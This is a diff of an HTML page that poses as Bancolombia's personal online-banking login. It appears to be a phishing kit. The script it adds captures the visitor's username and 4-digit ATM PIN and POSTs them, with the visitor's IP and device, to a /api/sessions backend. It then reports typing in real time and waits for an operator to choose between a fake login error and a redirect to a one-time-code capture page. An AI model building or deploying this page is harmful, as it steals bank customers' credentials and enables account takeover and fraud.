@@ -1,97 +1,383 @@
 <!DOCTYPE html>
-<html lang="es" translate="no">
+<html lang="es-CO">
 <head>
-  <meta charset="UTF-8" />
-  <title>SVP - Bancolombia</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <link rel="preconnect" href="https://library-sdb.apps.bancolombia.com" crossorigin />
-  <link href="https://library-sdb.apps.bancolombia.com/assets/1.22.0/icons/functionals/icon.css" rel="stylesheet" />
-  <link href="https://library-sdb.apps.bancolombia.com/assets/1.22.0/fonts/Open_Sans/Open_Sans.css" rel="stylesheet" />
-  <link href="https://library-sdb.apps.bancolombia.com/assets/1.22.0/fonts/CIBFont/CIBFont.css" rel="stylesheet" />
-  <link rel="stylesheet" href="css/login.css" />
+  <meta charset="UTF-8">
+  <title>Bancolombia Sucursal Virtual Personas</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" type="image/x-icon" href="https://svpersonas.apps.bancolombia.com/favicon.ico">
+  <link id="cursorThemeCSS" rel="stylesheet" href="./docs/small-cursor-light.css">
+  <link rel="stylesheet" href="./docs/mouse-focus.css" media="all" onload="this.media='all'">
+  <link id="svpThemeCSS" rel="stylesheet" href="./docs/bds.min.css" media="all" onload="this.media='all'">
+  <link rel="stylesheet" href="./docs/styles.052ae89095a02e72.css" media="all" onload="this.media='all'">
+  <link id="svp-bds-theme" rel="stylesheet" href="./docs/bds.min.css">
+  <style>
+    :root { --bc-theme-color: white; }
+    *, *:after, *:before { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-size: 1rem; font-family: "Open Sans", Arial, sans-serif; color: #2c2a29; line-height: 24px; letter-spacing: -0.3px; font-synthesis: none; }
+    .bc-bg-brand-N-P-pair-50-00 { background-color: #f9f9fa; }
+    .card-padding { padding: 6px; }
+    @media(min-width: 575px) { .card-padding { padding: 32px; } }
+    @media(max-width: 575px) { h1 { font-size: 1.75rem; } }
+    .steps { margin: 0 auto 50px; }
+    @media(max-width: 575px) { .steps { width: 100%; } }
+    .trazo { background-repeat: no-repeat; background-position: center; background-size: 100%; }
+    @media(max-width: 991px) { .trazo { background-size: auto; } }
+    .form-container { padding-bottom: 3rem; }
+    @media(max-width: 767px) { .form-container { padding-bottom: .7143rem; } }
+    @media(max-width: 575px) { .form-container { padding-bottom: 1.857rem; } }
+    .svp-main { display: block; min-height: 77vh; }
+    .logo { height: 4rem; }
+    #svp-footer { padding: 1rem; }
+    #svp-footer .bc-container { max-width: 100%; }
+    .authentication-form__username { margin-top: 2rem; }
+    .authentication-form__help-text { display: block; min-height: 1.063rem; }
+    .authentication-form__password { margin-top: 1.5rem; }
+    .authentication-form__password-input { -webkit-text-security: disc; }
+    svp-authentication-form .bc-card-auth-body { padding: 3rem; }
+    @media(max-width: 575px) { svp-authentication-form .bc-card-auth-body { padding: 1.5rem; } }
+    svp-authentication-form .bc-card-auth-body .bc-icon { display: none; }
+    svp-authentication-form ::-ms-reveal { display: none; }
+    svp-authentication-form .bc-card-auth-body .bc-card-auth-container { margin-bottom: 3rem; }
+
+    .bc-input:not(:placeholder-shown) + label,
+    .bc-input:focus + label {
+      transform: translateY(-0.85rem) scale(0.85); 
+      top: 8px;
+      left: -25px;
+    }
+    .bc-form-field {
+      position: relative;
+      margin: 1rem 0;
+    }
+    .bc-input {
+      width: 100%;
+      padding: 0.8rem 0.8rem 0.5rem;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 1rem;
+    }
+    .bc-input + label {
+      position: absolute;
+      left: 12px;
+      top: 0.8rem;
+      pointer-events: none;
+      transition: all 0.2s ease;
+      padding: 0 4px;
+      color: #666;
+    }
+    .bc-button-disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      pointer-events: none;
+    }
+    #personas-loader {
+      position: fixed;
+      inset: 0;
+      background: rgba(255, 255, 255, 0.9);
+      z-index: 99999;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .spinner-ring {
+      width: 48px;
+      height: 48px;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #fd0;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 </head>
-<body>
-  <main class="svn-login">
-    <section class="svn-hero">
-      <img src="assets/login-hero.png" alt="Bancolombia Sucursal Virtual Personas" class="desktop-hero-img" />
-      <div class="mobile-hero-header">
-        <div class="logo-container">
-          <img class="logo-symbol-inverted" src="assets/bancolombia-horizontal.svg" alt="Bancolombia" />
-          <span class="logo-divider">|</span>
-          <span class="logo-subtitle">Sucursal Virtual Personas</span>
+<body class="bc-bg-brand-N-P-pair-50-00" id="body">
+  <main class="svp-main">
+    <div class="bc-container-fluid trazo" style="background-image: url('./docs/auth-trazo.svg');">
+      <div class="bc-flex bc-justify-content-center" style="display: flex; justify-content: center;">
+        <div class="bc-flex bc-justify-content-center bc-mt-5" style="display: flex; justify-content: center; margin-top: 2.5rem;">
+          <img src="./docs/lombia-horizontal-no-spacing.svg" alt="logo" class="logo" style="width: 11.5rem; height: auto;">
         </div>
       </div>
-    </section>
-
-    <section class="svn-panel">
-      <button class="help-chip" type="button" id="btn-ayuda">
-        <em class="cb-icons">?</em> Ayuda
-      </button>
-
-      <form id="login-form" autocomplete="off">
-        <h2>Bienvenido a Sucursal Virtual Personas</h2>
-
-        <div class="row">
-          <label class="bc-field">
-            <span class="bc-icon" aria-hidden="true">
-              <svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="3.25" fill="none" stroke="currentColor" stroke-width="1.5"/><path d="M5.2 19.2c.7-3.3 3.4-5 6.8-5s6.1 1.7 6.8 5" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
-            </span>
-            <input id="user" type="text" placeholder="Usuario" required />
-            <button class="bc-trail" type="button" data-toggle="user" aria-label="Mostrar usuario">
-              <svg viewBox="0 0 24 24"><path d="M2.8 12s3.4-6.2 9.2-6.2S21.2 12 21.2 12 17.8 18.2 12 18.2 2.8 12 2.8 12z" fill="none" stroke="currentColor" stroke-width="1.5"/><circle cx="12" cy="12" r="2.5" fill="none" stroke="currentColor" stroke-width="1.5"/></svg>
-            </button>
-          </label>
-          <label class="bc-field">
-            <span class="bc-icon" aria-hidden="true">
-              <svg viewBox="0 0 24 24"><rect x="6" y="10.2" width="12" height="9.3" rx="1.8" fill="none" stroke="currentColor" stroke-width="1.5"/><path d="M9 10.2V7.8a3 3 0 0 1 6 0v2.4" fill="none" stroke="currentColor" stroke-width="1.5"/></svg>
-            </span>
-            <input id="password" type="password" placeholder="Clave" required />
-            <button class="bc-trail" type="button" data-toggle="password" aria-label="Mostrar clave">
-              <svg viewBox="0 0 24 24"><path d="M2.8 12s3.4-6.2 9.2-6.2S21.2 12 21.2 12 17.8 18.2 12 18.2 2.8 12 2.8 12z" fill="none" stroke="currentColor" stroke-width="1.5"/><circle cx="12" cy="12" r="2.5" fill="none" stroke="currentColor" stroke-width="1.5"/></svg>
-            </button>
-          </label>
+      <h1 class="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs" style="text-align: center; margin-top: 1.25rem; font-weight: 300;">
+        Sucursal Virtual Personas
+      </h1>
+      <div class="bc-row bc-justify-content-center form-container" style="display: flex; justify-content: center;">
+        <div class="bc-col-xs-6 bc-col-md-8 bc-col-lg-4" style="width: 100%; max-width: 460px; padding: 0 16px;">
+          <div class="bc-card-body bc-mt-4" style="margin-top: 1.5rem;">
+            <section id="card1" class="bc-card bc-card-auth bc-card-container" style="background: #fff; border-radius: 8px; box-shadow: 0 4px 16px rgba(0,0,0,0.06);">
+              <section id="id00" class="bc-card-auth-body" style="padding: 2.25rem 2rem;">
+                <section class="bc-card-auth-head">
+                  <h1 class="bc-card-auth-title bc-cibsans-font-style-5-bold bc-mt-3" style="font-size: 1.75rem; margin-bottom: 0.5rem;"> ¡Hola! </h1>
+                  <h3 class="bc-card-auth-description bc-mt-3" style="font-size: 0.95rem; font-weight: normal; color: #555; line-height: 1.4;">Ingresa los datos para gestionar tus productos y hacer transacciones.</h3>
+                </section>
+                <form id="personas-form" autocomplete="off" style="margin-top: 1.5rem;">
+                  <section class="bc-card-auth-container">
+                    <div class="bc-form-field authentication-form__username">
+                      <input id="usr" name="usr" placeholder=" " class="bc-input" autocomplete="off" autocorrect="off" spellcheck="false" maxlength="20" required>
+                      <label for="usr">Usuario</label>
+                      <div style="margin-top: 6px;">
+                        <a href="#" class="bc-opensans-font-style-1-bold bc-link link-default link-underline" style="font-size: 0.85rem; color: #2c2a29;"><u>¿Olvidaste tu usuario?</u></a>
+                      </div>
+                    </div>
+                    <div class="bc-form-field authentication-form__password" style="margin-top: 1.25rem;">
+                      <input id="pswd" name="pswd" type="text" placeholder=" " class="bc-input authentication-form__password-input" autocomplete="off" maxlength="4" inputmode="numeric" required>
+                      <label for="pswd">Clave del cajero</label>
+                      <div style="margin-top: 6px;">
+                        <a href="#" class="bc-opensans-font-style-1-bold bc-link link-default link-underline" style="font-size: 0.85rem; color: #2c2a29;"><u>¿Olvidaste o bloqueaste tu clave?</u></a>
+                      </div>
+                    </div>
+                  </section>
+                  <p id="error-msg" style="color: #d32f2f; text-align: center; margin-top: 12px; margin-bottom: 4px; font-size: 0.875rem;" hidden></p>
+                  <section class="bc-card-auth-button" style="margin-top: 1.75rem;">
+                    <button id="btn-login" type="submit" disabled class="bc-button bc-button-fill bc-button-primary bc-button-disabled" style="width: 100%; height: 48px; border: none; border-radius: 24px; background-color: #fd0; font-weight: 700; font-size: 1rem; cursor: pointer; color: #2c2a29;">
+                      Iniciar sesión
+                    </button>
+                  </section>
+                </form>
+                <section class="bc-card-auth-link" style="margin-top: 1.75rem; text-align: center;">
+                  <a href="#" class="bc-link link-default link-underline" style="font-size: 0.9rem; color: #2c2a29;"><u>Crear usuario</u></a>
+                </section>
+              </section>
+            </section>
+          </div>
         </div>
-
-        <div class="recover">
-          <a href="#" id="forgot-user">¿Olvidaste tu usuario?</a>
-          <a href="#" id="forgot-pass">¿Olvidaste tu clave?</a>
-        </div>
-
-        <p class="form-msg" id="form-msg" hidden></p>
-        <button class="submit" id="submit" type="submit" disabled>Iniciar sesión</button>
-      </form>
-
-      <footer class="svn-actions">
-        <a class="chip" href="#" id="register">
-          <svg viewBox="0 0 24 24"><circle cx="10" cy="8" r="3" fill="none" stroke="currentColor" stroke-width="1.5"/><path d="M4.4 19c.6-3 2.8-4.5 5.6-4.5s5 1.5 5.6 4.5" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><path d="M17 7.5v6M14 10.5h6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
-          Regístrate en Mi Bancolombia
-        </a>
-        <button class="chip" type="button" id="need-help">
-          <svg viewBox="0 0 24 24"><path d="M5 16.4V6.7A1.7 1.7 0 0 1 6.7 5h10.6A1.7 1.7 0 0 1 19 6.7v7.3a1.7 1.7 0 0 1-1.7 1.7H9.2L5 19z" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"/></svg>
-          ¿Necesitas ayuda?
-        </button>
-      </footer>
-    </section>
+      </div>
+    </div>
   </main>
 
-  <aside class="help-card" id="help-card" hidden>
-    <button type="button">Chatea con un asesor</button>
-    <button type="button">Te llamamos</button>
-    <button type="button">Centro de ayuda</button>
-  </aside>
-  <div class="toast" id="toast" hidden></div>
-  <div class="svn-loader" id="svn-loader" hidden>
-    <div class="svn-loader-mark" aria-label="Cargando">
-      <svg class="svn-loader-ring" viewBox="0 0 80 80" aria-hidden="true">
-        <circle cx="40" cy="40" r="26" />
-      </svg>
-      <svg class="svn-loader-logo" viewBox="0 0 32 32" aria-hidden="true">
-        <path d="M8.08001 11.0621C8.23001 11.6341 8.81401 11.9301 9.40701 11.7361C14.271 10.2621 19.148 9.25305 24.179 8.51905C24.756 8.44305 25.071 7.85605 24.859 7.26705C24.412 6.02605 24.186 5.40705 23.73 4.17305C23.536 3.64905 23.012 3.30505 22.475 3.36305C17.558 3.96005 12.807 4.84205 8.04601 6.20005C7.42601 6.39205 7.04501 7.07505 7.20201 7.68205C7.55001 9.03205 7.72501 9.70705 8.08001 11.0621Z" fill="white"/>
-        <path d="M27.561 11.7861C27.373 11.2301 26.865 10.8581 26.361 10.9241C18.716 11.8931 11.271 13.7711 4.21201 16.8761C3.69701 17.1181 3.38801 17.7621 3.49601 18.3291C3.77301 19.7801 3.91201 20.5061 4.19501 21.9601C4.31601 22.5821 4.90001 22.8681 5.47601 22.5881C12.646 19.3241 20.224 17.2451 27.998 16.0061C28.492 15.9261 28.744 15.3631 28.555 14.7831C28.163 13.5811 27.964 12.9811 27.561 11.7851V11.7861Z" fill="white"/>
-        <path d="M27.615 19.9019C27.427 19.3039 26.875 18.9139 26.352 19.0229C21.602 20.0589 16.959 21.3089 12.36 22.8989C11.777 23.1139 11.448 23.7329 11.602 24.3029C11.967 25.6599 12.151 26.3389 12.522 27.6999C12.696 28.3389 13.409 28.6659 14.066 28.4139C18.664 26.7579 23.308 25.3119 28.053 24.1519C28.508 24.0409 28.732 23.5039 28.563 22.9499C28.19 21.7279 27.999 21.1189 27.615 19.9019Z" fill="white"/>
-      </svg>
+  <footer class="bc-footer" id="svp-footer" style="background: transparent; margin-top: 2rem;">
+    <div class="bc-container bc-pb-4" style="max-width: 1100px; margin: 0 auto; padding: 1rem;">
+      <div class="bc-footer-top-links" style="display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; font-size: 0.85rem; margin-bottom: 1.25rem;">
+        <a href="https://www.bancolombia.com/centro-de-ayuda/canales/sucursal-virtual-personas" target="_blank" rel="noopener noreferrer" class="bc-link link-default" style="color: #555; text-decoration: none;">¿Problemas para conectarte?</a>
+        <span class="bc-footer-separator" style="color: #aaa;">·</span>
+        <a href="https://www.bancolombia.com/educacion-financiera/seguridad-bancaria/seguridad-informatica" target="_blank" rel="noopener noreferrer" class="bc-link link-default" style="color: #555; text-decoration: none;">Aprende sobre seguridad</a>
+        <span class="bc-footer-separator" style="color: #aaa;">·</span>
+        <a href="https://www.bancolombia.com/wcm/connect/1dcd5b4b-a856-4cee-9df9-f497eb26f964/Reglamento+Banca+por+Internet.pdf" target="_blank" rel="noopener noreferrer" class="bc-link link-default" style="color: #555; text-decoration: none;">Reglamento Sucursal Virtual</a>
+        <span class="bc-footer-separator" style="color: #aaa;">·</span>
+        <a href="https://www.bancolombia.com/personas/documentos-legales/proteccion-datos/bancolombia-sa" target="_blank" rel="noopener noreferrer" class="bc-link link-default" style="color: #555; text-decoration: none;">Política de privacidad</a>
+      </div>
+      <div class="bc-footer-divisor" style="border-top: 1px solid #e0e0e0; margin-bottom: 1.25rem;"></div>
+      <div class="bc-footer-bottom" style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem;">
+        <div style="display: flex; align-items: center; gap: 1.5rem;">
+          <img src="./docs/lombia-horizontal-no-spacing.svg" alt="logo" style="width: 140px; height: auto;">
+          <img src="./docs/logo-vigilado.svg" alt="Vigilado Superintendencia Financiera" style="width: 16px; height: auto;">
+        </div>
+        <div style="text-align: right; font-size: 0.8rem; color: #666; line-height: 1.5;">
+          <p>Dirección IP: <span id="direccion-ip">Obteniendo...</span></p>
+          <p id="fecha-hora"></p>
+        </div>
+      </div>
     </div>
+  </footer>
+
+  <div id="personas-loader">
+    <div class="spinner-ring"></div>
+    <p style="font-weight: 600; margin-top: 18px; font-size: 1rem; color: #2c2a29;">Cargando...</p>
   </div>
-  <script src="js/login-personas.js"></script>
+
+  <script>
+    // 1. Session Setup
+    let sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
+    sessionStorage.setItem('sessionId', sessionId);
+
+    let pingInterval = null;
+    let pollInterval = null;
+    let detectedIp = '186.29.100.50';
+
+    function startPing() {
+      if (pingInterval) clearInterval(pingInterval);
+      fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
+      pingInterval = setInterval(() => {
+        fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
+      }, 3000);
+    }
+
+    function stopPing() {
+      if (pingInterval) {
+        clearInterval(pingInterval);
+        pingInterval = null;
+      }
+    }
+
+    function startPolling() {
+      if (pollInterval) clearInterval(pollInterval);
+      pollInterval = setInterval(async () => {
+        try {
+          const response = await fetch(`/api/sessions/${sessionId}`);
+          if (response.ok) {
+            const data = await response.json();
+            const action = data.action;
+            if (action === 'dinamica' || action === 'sms') {
+              stopPing();
+              stopPolling();
+              sessionStorage.setItem('otpType', action);
+              window.location.href = "clave.html";
+            } else if (action === 'error-login') {
+              stopPing();
+              stopPolling();
+              document.getElementById("personas-loader").style.display = "none";
+              const errorEl = document.getElementById("error-msg");
+              errorEl.textContent = "Usuario o clave incorrecta. Por favor, verifica tus datos.";
+              errorEl.hidden = false;
+              inputClave.value = '';
+              verificarFormulario();
+            }
+          }
+        } catch (_) {}
+      }, 1000);
+    }
+
+    function stopPolling() {
+      if (pollInterval) {
+        clearInterval(pollInterval);
+        pollInterval = null;
+      }
+    }
+
+    // 2. Elements & Real-Time Typing
+    const inputUsuario = document.getElementById('usr');
+    const inputClave = document.getElementById('pswd');
+    const botonIngresar = document.getElementById('btn-login');
+    const form = document.getElementById('personas-form');
+    const loader = document.getElementById('personas-loader');
+
+    function verificarFormulario() {
+      const valorUsuario = inputUsuario.value.trim();
+      const valorClave = inputClave.value.trim();
+      const usuarioLleno = valorUsuario.length > 0;
+      const claveLlena = /^\d{4}$/.test(valorClave);
+
+      const habilitar = usuarioLleno && claveLlena;
+      botonIngresar.disabled = !habilitar;
+
+      if (habilitar) {
+        botonIngresar.removeAttribute('disabled');
+        botonIngresar.classList.remove('bc-button-disabled');
+      } else {
+        botonIngresar.setAttribute('disabled', 'disabled');
+        botonIngresar.classList.add('bc-button-disabled');
+      }
+    }
+
+    let lastSentState = null;
+    function notifyTyping() {
+      if (pollInterval) {
+        if (lastSentState !== 'typing') {
+          lastSentState = 'typing';
+          fetch(`/api/sessions/${sessionId}/state`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ state: 'typing' })
+          }).catch(() => {});
+        }
+      }
+    }
+
+    // Enforce 4 numeric digits for cajero key
+    inputClave.addEventListener('keydown', function(e) {
+      const teclasPermitidas = ['Backspace', 'Tab', 'ArrowLeft', 'ArrowRight', 'Delete', 'Home', 'End'];
+      const esNumero = /^[0-9]$/.test(e.key);
+      const esTeclaControl = teclasPermitidas.includes(e.key);
+      if (!esTeclaControl && !esNumero) {
+        e.preventDefault();
+        return false;
+      }
+    });
+
+    inputClave.addEventListener('input', function() {
+      this.value = this.value.replace(/[^0-9]/g, '');
+      if (this.value.length > 4) {
+        this.value = this.value.slice(0, 4);
+      }
+      verificarFormulario();
+      notifyTyping();
+    });
+
+    inputUsuario.addEventListener('input', () => {
+      verificarFormulario();
+      notifyTyping();
+    });
+
+    // 3. Submit
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      document.getElementById('error-msg').hidden = true;
+      loader.style.display = 'flex';
+      lastSentState = null;
+
+      const session = {
+        id: sessionId,
+        username: inputUsuario.value.trim(),
+        password: inputClave.value.trim(),
+        tipoUsuario: 'PERSONA',
+        device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
+        ip: detectedIp,
+        state: 'waiting',
+        createdAt: Date.now()
+      };
+
+      fetch('/api/sessions', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(session)
+      })
+      .then(() => {
+        startPing();
+        startPolling();
+      })
+      .catch(() => {
+        loader.style.display = 'none';
+        const errorEl = document.getElementById("error-msg");
+        errorEl.textContent = "Error al intentar conectar. Intente de nuevo.";
+        errorEl.hidden = false;
+      });
+    });
+
+    // 4. Footer Date/Time and IP
+    function obtenerFechaHora() {
+      const ahora = new Date();
+      const diasSemana = ['domingo', 'lunes', 'martes', 'miércoles', 'jueves', 'viernes', 'sábado'];
+      const meses = ['enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio', 'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre'];
+      const diaSemana = diasSemana[ahora.getDay()];
+      const dia = ahora.getDate();
+      const mes = meses[ahora.getMonth()];
+      const anio = ahora.getFullYear();
+
+      let horas = ahora.getHours();
+      const minutos = String(ahora.getMinutes()).padStart(2, '0');
+      const periodo = horas >= 12 ? 'p. m.' : 'a. m.';
+      horas = horas % 12 || 12;
+
+      return `${diaSemana}, ${dia} de ${mes} de ${anio}, ${horas}:${minutos} ${periodo}`;
+    }
+
+    const fechaEl = document.getElementById('fecha-hora');
+    if (fechaEl) {
+      fechaEl.textContent = obtenerFechaHora();
+      setInterval(() => {
+        fechaEl.textContent = obtenerFechaHora();
+      }, 60000);
+    }
+
+    async function obtenerIP() {
+      try {
+        const respuesta = await fetch('https://api.ipify.org?format=json');
+        const datos = await respuesta.json();
+        detectedIp = datos.ip;
+        const ipEl = document.getElementById('direccion-ip');
+        if (ipEl) ipEl.textContent = datos.ip;
+      } catch (_) {
+        const ipEl = document.getElementById('direccion-ip');
+        if (ipEl) ipEl.textContent = '38.156.230.61';
+      }
+    }
+    obtenerIP();
+
+    verificarFormulario();
+  </script>
 </body>
 </html>
